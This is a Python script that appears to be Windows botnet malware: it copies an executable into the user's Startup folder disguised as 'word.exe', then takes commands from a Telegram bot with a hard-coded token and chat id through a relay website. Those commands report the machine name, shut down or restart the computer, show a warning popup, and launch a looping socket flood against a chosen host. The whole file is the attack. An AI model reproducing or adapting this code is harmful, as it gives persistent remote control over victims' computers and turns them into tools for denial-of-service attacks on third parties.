
import requests
import json
import time
from socket import *
from bs4 import BeautifulSoup
import os 
import plyer.platforms.win.notification
from plyer import notification

import shutil
# if u want costmiaze your code just all token bot change in farst make yourself bot and get bot token replace  all of varbile have token bot  didnt work u u have mistaked 
try:
    # Get the current user's login name
    user = os.getlogin()
    user_1 = user.replace("-PC", "")
    
    # Define the path to the Startup folder
    startup_path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(user_1)
    destination = os.path.join(startup_path, "word.exe")
    
    # Source file path
    source = "math.exe"

    # Check if the source file exists
    if os.path.exists(source):
        # Copy the executable to the Startup folder
        shutil.copy(source, destination)
        print(f"Successfully copied to {destination}")
        
        cheack_replace="https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/SendMessage?chat_id=629843196&text=The exe recplafce start menu"
        payloa_chack = {"UrlBox":cheack_replace,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }

        cheack_response=requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloa_chack)
    else:
        print(f"Source file {source} does not exist.")
        dont_repalce="https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/SendMessage?chat_id=629843196&text=The exe dont replace start menu"
        payloa_chack_off = {"UrlBox":dont_repalce,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }
       
        dont_response=requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloa_chack_off)
except Exception as e:
    print(f"An error occurred: {e}")
def DO(targe):
    if "https" or "http" in targe:
         targe=targe.replace("https","")
         targe=targe.replace("http","")

    ip=gethostbyname(targe)
    n=0
    while n<1000:
        n+=1
        s=socket(AF_INET,SOCK_STREAM)
        try:
            s.connect((ip,80))
            buff = "User-Agent:"+"A"*500
            s.send(("GET / HTTP/1.1\r\n" + "\n\n" + buff).encode())
            print("[+] Sended Packaet")
            URL_2 = "https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/Getupdates"
            playd = {"UrlBox":URL,
                    "AgentList":"Mozilla Firefox",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"POST"
                    }
            
            reqs =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",playd)
            
            sources = reqs.text
            soups = BeautifulSoup(sources,"html.parser")
            resualtd = soups.find("div" ,  id="ResultData").text
            resualt_23 = resualtd.replace("Response Content","")
            DATAd = json.loads(resualt_23)["result"]
        except:
            error="dont come data"
        n = 0
        while True:
              n += 1
              try:
                    DATAd[n]['message']['text']
                
              except:
                     keys =  DATAd[n-1]['message']['text']
                     break
        last_keyd = keys
        print(last_keyd)
        s.close()
        time.sleep(4)
        if keys=="/OFFDOS":
             break
 


def notifications(text):
  notification.notify("خطر خطر (توجه کنید )", f"{text}")


while True:
    try:
       reust_cheack=requests.get("https://www.google.com")
       time.sleep(6)
       print(reust_cheack)
       if reust_cheack.status_code == 200:
            print("internet aviblie")
            time.sleep(7)
            try:
                URL = "https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/Getupdates"

                play = {"UrlBox":URL,
                                "AgentList":"Mozilla Firefox",
                                "VersionsList":"HTTP/1.1",
                                "MethodList":"POST"
                                }

                req =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",play)
                

                
                
                source = req.text
                soup = BeautifulSoup(source,"html.parser")

                resualt = soup.find("div" ,  id="ResultData").text

                resualt_2 = resualt.replace("Response Content","")
                DATA = json.loads(resualt_2)["result"]
                print(F"THE INFROMATION DATA {DATA}")
            except requests.exceptions.RequestException as df:
                print(f"dont get infrmaion url {df}")
            except json.JSONDecodeError:
                 print("Error decoding JSON response")
            except Exception as e:
                 print(f"An error occurred: {e}")
            try:
               check_index=DATA[0]['message']['from']['username']
               
               if check_index:
                    n = 0
                    while True:
                        n += 1
                        try:
                        
                                DATA[n]['message']['text']
                        
                        except:
                    
                                key =  DATA[n-1]['message']['text']
                                break
                    try:    
                        last_key = key
                    except:
                        print("....")
                
                    print( key)

                    if key is None and last_key is None:
                        print("erro in the key and last key")
                    else:
                            
                        if last_key == "/on":
                                

                                time.sleep(2)
                                try:
                                    URL_1 = f"https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/SendMessage?chat_id=629843196&text= The computer name  online  "+str(user)

                                    payloa_1 = {"UrlBox":URL_1,
                                        "AgentList":"Mozilla Firefox",
                                        "VersionsList":"HTTP/1.1",
                                        "MethodList":"POST"
                                        }

                                    requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloa_1)

                                

                                    time.sleep(15)
                                except:
                                    erro_con="restart pc"
                        else:
                            print("no cammand i recived")            
                        if key == "/off":

                                time.sleep(3)
                                try:
                                    URL_1 = "https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/SendMessage?chat_id=629843196&text=off"

                                    payloa_1 = {"UrlBox":URL_1,
                                        "AgentList":"Mozilla Firefox",
                                        "VersionsList":"HTTP/1.1",
                                        "MethodList":"POST"
                                        }

                                    requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloa_1)

                                    os.system("shutdown /s /t 1")
                                    
                                    time.sleep(15)
                                except:
                                    reror="did connetct /off restart"
                        else:
                            print("no cammand of")
                        if key == "/restart":  
                                

                                time.sleep(4)
                                try:
                                    URL_1 = "https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/SendMessage?chat_id=629843196&text=off"

                                    payloa_1 = {"UrlBox":URL_1,
                                        "AgentList":"Mozilla Firefox",
                                        "VersionsList":"HTTP/1.1",
                                        "MethodList":"POST"
                                        }

                                    requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloa_1)

                                    os.system("shutdown /r /t 0")
                                
                                    time.sleep(10)
                                except:
                                    erro_restart="dont restart"

                        if last_key[0:4] == "/dos": #the idea here send notifaction 

                                time.sleep(2)
                                try:
                                    URL_1 = f"https://api.telegram.org/bot7550043421:AAFvJOO_gNHMLZ1cpLkSfuea2X3EcUMICIA/SendMessage?chat_id=629843196&text=The computer name for dos is "+str(user)

                                    payloa_1 = {"UrlBox":URL_1,
                                        "AgentList":"Mozilla Firefox",
                                        "VersionsList":"HTTP/1.1",
                                        "MethodList":"POST"
                                        }

                                    requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloa_1)
                                    targe = last_key[5:]
                                    print (targe)
                                    
                                    DO(targe)
                                except requests.ConnectionError:
                                    erro_do="dont work dos plaear restart"
                        else:
                            print("no")            
                        if key[0:5]=="/noti":
                                try:
                                    time.sleep(5)
                                    tex=key[6:]
                                    print(f"the text noticfation {tex}")
                                    notifications(tex)
                                except:
                                    erro_notoi="erro"        
                        else:

                            
                                continue
            except (IndexError,KeyError) as ds:
                 print(f"erro in index {ds}")
    except requests.ConnectionError:
        print(" dont conect to internet")


